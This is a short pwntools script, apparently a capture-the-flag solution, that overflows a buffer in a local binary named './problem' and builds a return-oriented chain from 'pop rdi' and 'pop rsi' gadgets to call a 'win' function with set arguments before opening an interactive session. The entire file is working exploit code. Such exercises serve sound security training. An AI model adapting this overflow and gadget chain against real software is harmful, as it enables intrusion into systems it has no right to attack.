from pwn import *

binary = "./problem"
p = process(binary)
elf = context.binary = ELF(binary)

# 0x0000000000400923 : pop rdi ; ret
# 0x0000000000400921 : pop rsi ; pop r15 ; ret

rdi = p64(0x0000000000400923)
rsi = p64(0x0000000000400921)


win = p64(0x004007b6)

payload = b"a"*9
payload += rdi
payload += p64(0x1)
payload += rsi
payload += p64(0x400952)
payload += p64(0x0)

payload += win


p.recv()
p.sendline(payload)
p.interactive()